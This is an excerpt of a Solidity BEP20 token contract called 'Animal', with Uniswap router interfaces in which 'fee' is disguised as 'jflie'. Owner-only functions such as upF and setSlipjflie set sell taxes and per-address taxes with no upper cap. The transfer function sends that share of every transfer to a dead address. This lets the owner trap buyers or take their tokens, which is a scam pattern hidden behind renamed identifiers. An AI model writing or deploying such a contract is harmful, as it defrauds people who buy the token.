...
interface IUniswapV2Factory {
    ...
    function jflieTo() external view returns (address);
    function jflieToSetter() external view returns (address);
    ...
    function setjflieTo(address) external;
    function setjflieToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingjflieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingjflieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingjflieOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingjflieOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingjflieOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Animal is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelljflie = 0;

    uint256 private _defaultBuyjflie = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipjflie;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelljflie = _value;
    }

    function setSlipjflie(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipjflie[_address] = _value;
    }

    function getSlipjflie(address _address) external view onlyownar returns (uint256) {
        return _slipjflie[_address];
    }


    function setMAccountjflie(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountjflie(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradejflieAmount = 0;

        if (rF) {
            uint256 tradejflie = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradejflie = _defaultSelljflie;
                }
                if (from == uniswapV2Pair) {

                    tradejflie = _defaultBuyjflie;
                }
            }
            if (_slipjflie[from] > 0) {
                tradejflie = _slipjflie[from];
            }

            tradejflieAmount = _Amount.mul(tradejflie).div(100);
        }


        if (tradejflieAmount > 0) {
            _balances[from] = _balances[from].sub(tradejflieAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradejflieAmount);
            emit Transfer(from, _deadAddress, tradejflieAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradejflieAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradejflieAmount);
        emit Transfer(from, _to, _Amount - tradejflieAmount);
    }
